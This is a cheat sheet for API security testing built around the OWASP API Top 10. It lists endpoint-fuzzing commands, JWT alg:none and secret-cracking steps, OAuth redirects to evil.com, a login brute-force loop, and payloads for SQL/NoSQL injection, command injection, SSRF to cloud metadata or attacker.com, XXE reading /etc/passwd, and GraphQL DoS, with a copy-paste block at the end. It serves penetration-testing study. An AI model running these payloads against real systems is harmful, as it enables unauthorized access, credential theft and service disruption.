# API SECURITY TESTING COMPLETE CHEAT SHEET

## 1. WHAT IS API SECURITY TESTING?

APIs are the backbone of modern applications. Testing them is different from testing web apps because:

- No HTML — everything is JSON/XML
- **Mass assignment** and **excessive data exposure** are common
- **BOLA/IDOR** and **BFLA** replace classic access control issues
- **Rate limiting** is critical
- **Authentication** is often token-based (JWT, OAuth, API keys)

**Key fact:** OWASP API Security Top 10 is the reference. Most bugs are authorization issues, not injections.

---

## 2. OWASP API TOP 10 (2023)

| # | Vulnerability |
|---|---------------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization (BFLA) |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery (SSRF) |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## 3. DISCOVERY & ENUMERATION

### 3.1 Find API Endpoints

```bash
# Common paths
/api
/api/v1
/api/v2
/api/v3
/rest
/graphql
/swagger.json
/swagger.yaml
/openapi.json
/api-docs
/docs
/redoc
/.well-known/

# Fuzz for endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt
gobuster dir -u https://target.com/api/ -w /usr/share/wordlists/api-endpoints.txt
```

### 3.2 Swagger / OpenAPI Discovery

```bash
# Common locations
/swagger.json
/swagger/v1/swagger.json
/api/swagger.json
/openapi.json
/api-docs
/v2/api-docs
/v3/api-docs

# Parse and enumerate
curl https://target.com/swagger.json | jq '.paths | keys'
curl https://target.com/openapi.json | jq '.paths | keys'
```

### 3.3 Kiterunner — API Route Brute Force

```bash
kr scan https://target.com -w routes-large.kite
kr brute https://target.com -w wordlist.txt -x 200,301,401,403
```

### 3.4 JavaScript Analysis for Endpoints

```bash
# Extract API calls from JS
katana -u https://target.com -jc -f qurl -silent | grep "/api/"
cat app.js | grep -oE '"/api/[^"]+"' | sort -u
```

---

## 4. AUTHENTICATION TESTING

### 4.1 API Key in Headers

```bash
# Common header names
X-API-Key
Authorization: Bearer <token>
Authorization: Apikey <key>
X-Auth-Token
X-Access-Token
api-key
```

### 4.2 JWT Analysis

```bash
# Decode
echo "eyJ..." | cut -d. -f2 | base64 -d | jq .

# Test alg:none
python3 jwt_tool.py <JWT> -X a

# Crack weak secret
hashcat -m 16500 jwt.txt wordlist.txt

# Kid injection
python3 jwt_tool.py <JWT> -X k
```

### 4.3 OAuth Flows

```bash
# Test redirect_uri
GET /oauth/authorize?response_type=code&client_id=X&redirect_uri=https://evil.com

# Test state parameter (CSRF)
# Test token leakage in Referer
# Test implicit flow for token theft
```

---

## 5. AUTHORIZATION TESTING (BOLA / BFLA)

### 5.1 BOLA / IDOR

```bash
# Change IDs in requests
GET /api/users/1
GET /api/users/2

# Try object references
GET /api/orders/1001
GET /api/invoices/500
```

**Automation:**
```bash
# Burp Intruder or ffuf with ID wordlist
ffuf -u https://target.com/api/users/FUZZ -w ids.txt -H "Authorization: Bearer $TOKEN" -mc 200
```

### 5.2 BFLA (Function Level)

```bash
# Try admin endpoints with user token
GET /api/admin/users
DELETE /api/admin/users/1
POST /api/admin/config

# Switch HTTP methods
GET /api/user → POST /api/user
PUT /api/user/1 → DELETE /api/user/1
```

### 5.3 Mass Assignment

```json
// Send extra fields not exposed in UI
POST /api/users
{
  "username": "attacker",
  "password": "pass",
  "isAdmin": true,        // ← test
  "role": "admin",        // ← test
  "credits": 999999       // ← test
}
```

### 5.4 Excessive Data Exposure

```bash
# Look for fields in responses not shown in UI
GET /api/users/1
# Response may include: password_hash, ssn, api_key, internal_id
```

---

## 6. RATE LIMIT & RESOURCE TESTING

```bash
# Send many requests to test rate limit
for i in {1..200}; do curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/login -d "user=admin&pass=x"; done

# Test resource consumption
# - Large payload sizes
# - Deep JSON nesting
# - Regex DoS
# - GraphQL deep queries
```

**ReDoS payload:**
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

**JSON bomb:**
```json
{"a":{"a":{"a":{"a":{"a":{"a":{"a":...}}}}}}
```

---

## 7. INJECTION TESTING IN APIs

### 7.1 SQL Injection

```json
{"username": "admin' OR '1'='1"}
{"id": "1 UNION SELECT NULL-- -"}
```

### 7.2 NoSQL Injection

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}}
```

### 7.3 Command Injection

```json
{"host": "; whoami"}
{"url": "| whoami"}
```

### 7.4 SSRF via APIs

```json
{"url": "http://169.254.169.254/latest/meta-data/"}
{"webhook": "http://attacker.com"}
{"callback": "http://127.0.0.1:8080/admin"}
```

### 7.5 XXE in XML APIs

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## 8. GRAPHQL-SPECIFIC TESTING

### 8.1 Introspection

```graphql
{__schema{types{name fields{name}}}}
```

### 8.2 Query Batching / Aliasing

```graphql
query {
  a: login(user:"admin", pass:"pass1"){token}
  b: login(user:"admin", pass:"pass2"){token}
}
```

### 8.3 Deep Query DoS

```graphql
{user{posts{comments{user{posts{comments{id}}}}}}}
```

### 8.4 Field Suggestion Abuse

```graphql
{ user { password } }   # Error suggests "passwordHash"
```

---

## 9. TOOLS

| Tool | Purpose |
|------|---------|
| **Postman** | Manual API testing |
| **Insomnia** | API client |
| **Burp Suite** | Intercept, modify, fuzz |
| **ffuf** | Endpoint fuzzing |
| **Kiterunner** | API route discovery |
| **Arjun** | Parameter discovery |
| **Postman-API-Fuzzer** | Automated fuzzing |
| **APICheck** | API security toolkit |
| **jwt_tool** | JWT testing |
| **GraphQL Voyager** | GraphQL schema visualization |
| **InQL** (Burp) | GraphQL testing |

### 9.1 Arjun — Hidden Parameters

```bash
arjun -u https://target.com/api/user -m GET
arjun -u https://target.com/api/user -m POST -w params.txt
```

### 9.2 Kiterunner

```bash
kr scan https://target.com -w routes-large.kite -x 20
```

---

## 10. TIPS

1. **Always test BOLA first** — it's the #1 API bug.
2. Check both **GET and POST** for each endpoint.
3. Try **HTTP method override** (`X-HTTP-Method-Override: DELETE`).
4. Test **hidden parameters** with Arjun — they often bypass auth.
5. Look for **excessive data in responses** — password hashes, tokens.
6. Use `-H "Content-Type: application/json"` — some APIs behave differently.
7. Rate limit tests must be **authorized** — could cause DoS.
8. Fuzz with **both** string and object values (`"id":"1"` vs `"id":{"$ne":null}`).
9. For GraphQL, always try introspection first.
10. Save every request — APIs change frequently.

---
## COPY PASTE

```
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt
gobuster dir -u https://target.com/api/ -w /usr/share/wordlists/api-endpoints.txt
curl https://target.com/swagger.json | jq '.paths | keys'
curl https://target.com/openapi.json | jq '.paths | keys'
kr scan https://target.com -w routes-large.kite
kr brute https://target.com -w wordlist.txt -x 200,301,401,403
katana -u https://target.com -jc -f qurl -silent | grep "/api/"
cat app.js | grep -oE '"/api/[^"]+"' | sort -u
echo "eyJ..." | cut -d. -f2 | base64 -d | jq .
python3 jwt_tool.py <JWT> -X a
hashcat -m 16500 jwt.txt wordlist.txt
python3 jwt_tool.py <JWT> -X k
ffuf -u https://target.com/api/users/FUZZ -w ids.txt -H "Authorization: Bearer $TOKEN" -mc 200
curl -X POST https://target.com/api/users -d '{"username":"x","isAdmin":true}'
for i in {1..200}; do curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/login -d "user=admin&pass=x"; done
arjun -u https://target.com/api/user -m GET
arjun -u https://target.com/api/user -m POST -w params.txt
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}}
{"url": "http://169.254.169.254/latest/meta-data/"}
{__schema{types{name fields{name}}}}
{user{posts{comments{user{posts{comments{id}}}}}}}
```
